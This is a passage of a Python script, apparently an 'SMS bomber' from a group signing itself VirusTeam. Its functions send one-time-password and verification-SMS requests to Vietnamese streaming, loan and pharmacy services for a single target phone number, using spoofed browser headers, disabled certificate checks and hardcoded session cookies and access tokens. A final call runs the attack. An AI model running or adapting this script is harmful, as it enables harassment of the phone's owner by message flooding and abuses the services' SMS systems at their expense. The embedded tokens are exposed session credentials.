        "host": "api.glxplay.io",
        "content-length": "0",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "x-requested-with": "XMLHttpRequest",
        "accept-language": "vi",
        "sec-ch-ua-mobile": "?0",
        "access-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJhZjI2YWJmYS0wYjQxLTRlMzAtYTg2Yi00ZjU0OWIzOTRiMmQiLCJkaWQiOiJhYTZmYzA5YS05ZjI3LTRlZjctOTMzMi1kMzhjNDk4OTE2NTkiLCJpcCI6IjExNi4xMTEuMTg2LjIzMiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfGFuZHJvaWR8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTcyMDg0OTI5MSwiZXhwIjoxNzM2NDAxMjkxfQ.BTcgD_2lm33gaIW8HGeJ8JoK8ZI0p7eYPLEzMsapGno",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "accept": "*/*",
        "origin": "https://galaxyplay.vn",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://galaxyplay.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "priority": "u=1, i"
    }
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, verify=False)
def VsTeamHttpRequests51(sdt_vs):
    VirusTeam_Url = 'https://api.vloan.xyz/api/register/app/sendSms'
    headers = {
        "host": "api.vloan.xyz",
        "connection": "keep-alive",
        "content-length": "335",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "appversion": "5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "screenresolution": "720.2999906539917,1612.4062290787697",
        "w": "720.2999906539917",
        "channel": "fb4a",
        "sec-ch-ua-platform": "\"Android\"",
        "system": "android",
        "appcodename": "Mozilla",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "content-type": "application/json",
        "content-language": "vn",
        "accept": "application/json, text/plain, */*",
        "appname": "Netscape",
        "vendor": "Google Inc.",
        "platform": "Linux armv81",
        "h": "1612.4062290787697",
        "devicetype": "h5",
        "origin": "https://h5.vnvloan.xyz",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://h5.vnvloan.xyz/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
    }
    cookies = {
        
    }
    payload = {
    "phone": sdt_vs,
    "type": 2,
    "timestamp": 1719665082806,
    "referrer": "utm_source=fb4a",
    "af_prt": "fb4a",
    "sign": "0f656af82eb1da33221a06d1171db265",
    "appversion": "1.0.0",
    "channel": "1",
    "app_version": "1.0.0",
    "version": "1.0.0",
    "imei": "7a5e23b6e63755bfca7774ce004991d8",
    "uuid": "7a5e23b6e63755bfca7774ce004991d8",
    "pkg_name": "com.qcloan.vloanh5"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests52(sdt_vs):
    VirusTeam_Url = 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification'
    headers = {
        "host": "api.nhathuoclongchau.com.vn",
        "content-length": "60",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-mobile": "?0",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "x-channel": "EStore",
        "content-type": "application/json",
        "access-control-allow-origin": "*",
        "accept": "application/json, text/plain, */*",
        "order-channel": "1",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://nhathuoclongchau.com.vn",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://nhathuoclongchau.com.vn/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "priority": "u=1, i"
    }
    cookies = {
        
    }
    payload = {
    "phoneNumber": sdt_vs,
    "otpType": 0,
    "fromSys": "WEBKHLC"
}
    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
    try:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
    except requests.exceptions.JSONDecodeError:
        return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
def VsTeamHttpRequests53(sdt_vs):
    VirusTeam_Url = 'https://vietloan.vn/register/phone-change'
    headers = {
        'authority': 'vietloan.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    cookies = {
        '_gcl_au': '1.1.295235452.1719860479',
        '_fbp': 'fb.1.1719860479475.242945561775878',
        'mousestats_vi': 'dda73803d781185920d6',
        '_ym_uid': '1719860482100163437',
        '_ym_d': '1719860482',
        '_tt_enable_cookie': '1',
        '_ttp': '6en-_m2tJeGJzJuvwKkT52EXUWy',
        '__cfruid': '1ca9fca3166df13e563fdc8d57b265e089e20792-1720857921',
        '_gid': 'GA1.2.255395990.1720857925',
        'mousestats_si': '113a700bd3fe885632b6',
        '_clck': '1sr0rco%7C2%7Cfnf%7C0%7C1643',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        'XSRF-TOKEN': 'eyJpdiI6Im1Qd0VRQllFR2lWODBhVDV0dThTNkE9PSIsInZhbHVlIjoiWVVKV1phcDQyNmlmY3YwNG1HRldkODg3UFZRQ3c1bHFuM0lCbFViWjN1YUdjMG5JdlVpL3R1NWNsamMyZ2RPNUJ6dWdwdWZWN1RXUzIzdDEyMkVPcm03TFdmK1dCTlhMcmNCNGtwS2hQMWcrWlA0aFNHQm5SWWFSdTdlNmt5NHUiLCJtYWMiOiI4YWRjNGU0N2M1YjUzNDgwMGY4NDc1MWY3ODdmN2M0ZGMxYjEwYzU0YjRlODI1YmFlMGIxYjI3YmQ5ODA5MWU1IiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IjhaNjltdEZWalpaYm9QRW1mZDA1SFE9PSIsInZhbHVlIjoiYXN1akRsQnZJMVdsTHRCU1pmL21wTllRUkVqcVlXWHdYaVdoeVE1cXBTMlhaMDFsZWtvcFhvaThQWHRLcm10NGFOUmE1OGg0b1BiekVyWnA1Yk8wb0V1dXRheFlVNzF6Q3RqakIzYmpiNFNDT21JQnpCK0N0T0Q3OFJqRXRKRmYiLCJtYWMiOiIwY2QxOWEwNGU5YTM4ZWIxMGZhMDAwYTE4NzY3MjU4ZDhhNDdhMWIxOTk5MjI2MGM5MzUwZjhjYzVkM2UzYTJmIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6ImRpVXRnU3RGNGhwS3JsNW04VE4xcWc9PSIsInZhbHVlIjoiRDhSMXlDRm0xMDdxOFpDdGt3SzhBblBvcG9yM00ya1F2MDc2T0g3UE8wU24wSWhWZmhwQ3BMT2RTUGF2d3Q3dnFDclF4TXcyYm12VmNYUXFLK1FjdzlTMURGMjRWdU8rUWJzMVN2akJOa1oxcVV1TVRYa0I0c3hURlVZNGRwaUwiLCJtYWMiOiJkZjc0OTIzOTViNDgyZDliNWY3OTljZDA2NmI2NjQzZTkwOWRmYzJmZjRhNGFjZWMwNDFhOTc0YTg5MzlkZGQ2IiwidGFnIjoiIn0%3D',
        'ec_png_utm': '4f8f586b-eb2b-5395-b064-4d69a817ff4f',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_utm': '4f8f586b-eb2b-5395-b064-4d69a817ff4f',
        'ec_cache_utm': '4f8f586b-eb2b-5395-b064-4d69a817ff4f',
        'ec_etag_client': 'false',
        'ec_cache_client': 'false',
        'ec_etag_client_utm': 'null',
        'ec_cache_client_utm': 'null',
        '_ga': 'GA1.2.172914298.1719860480',
        '_clsk': '1bemdj1%7C1720858984101%7C18%7C1%7Cq.clarity.ms%2Fcollect',
        'uid': '4f8f586b-eb2b-5395-b064-4d69a817ff4f',
        'client': 'false',
        'client_utm': 'null',
        '_ga_EBK41LH7H5': 'GS1.1.1720857924.3.1.1720859052.60.0.0',
    }
    params = {
        'another_phone': sdt_vs
    }
    response = requests.get(VirusTeam_Url, params=params, cookies=cookies, headers=headers, verify=False)
run(sdt_vs)